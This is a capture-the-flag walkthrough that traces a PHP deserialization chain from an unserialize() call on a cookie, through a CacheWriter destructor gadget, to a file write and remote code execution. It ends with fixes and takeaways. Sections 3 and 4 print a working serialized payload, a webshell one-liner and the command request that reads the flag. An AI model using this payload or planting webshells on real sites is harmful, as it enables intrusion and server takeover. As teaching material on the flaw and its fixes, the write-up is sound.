# Walkthrough — Estate Sale  (SPOILERS)

**Chain:** unauthenticated PHP object injection → `CacheWriter` POP gadget → arbitrary file write →
webshell → RCE → flag.

## 1. The sink
`src/index.php`, on every request:
```php
if (isset($_COOKIE['remember'])) {
    $token = unserialize(base64_decode($_COOKIE['remember']));
    if ($token instanceof RememberToken) {
        $_SESSION['user'] = $token->username;
    }
}
```
`unserialize()` is called on fully attacker-controlled data. The `instanceof` check is too late — the
object (and its magic methods) already ran. No login needed; this fires for anonymous visitors.

## 2. The gadget
`src/classes.php` defines a second class used for caching:
```php
class CacheWriter {
    public $file;
    public $data;
    public function __destruct() {
        if (!empty($this->file)) {
            file_put_contents($this->file, $this->data);
        }
    }
}
```
When a `CacheWriter` object is destroyed (end of request), it writes `data` to `file`. We control both
properties, so this is an arbitrary file write — a classic **POP (Property-Oriented Programming) gadget**.

## 3. Weaponise — drop a webshell
Build a serialized `CacheWriter` that writes a PHP shell into the webroot:
```
O:11:"CacheWriter":2:{s:4:"file";s:23:"/var/www/html/sh3ll.php";s:4:"data";s:28:"<?php system($_GET['c']); ?>";}
```
Base64-encode it and send it as the `remember` cookie. On that request, `unserialize()` builds the
object; at request end `__destruct()` writes `sh3ll.php`. The container's webroot is owned by
`www-data`, so the write succeeds.

## 4. RCE
```
GET /sh3ll.php?c=cat%20/flag.txt
→ FLAG{unserialize_is_a_cod3_execution_sink}
```

`exploit/exploit.py` builds the serialized payload programmatically (so the string lengths are always
correct), drops the shell, and reads the flag in one run.

## Fixes
- **Never `unserialize()` attacker-controlled data.** Use `json_decode()` for data interchange.
- If you must, pass `['allowed_classes' => false]` to `unserialize()` and sign the cookie (HMAC) so it
  can't be tampered with.
- Keep dangerous side effects out of magic methods.

## Takeaways
- An `instanceof` check *after* `unserialize()` protects nothing — the gadget already ran.
- POP chains turn "just a deserialization" into file write, then RCE. Hunt magic methods in the whole
  class graph, not only the expected class.
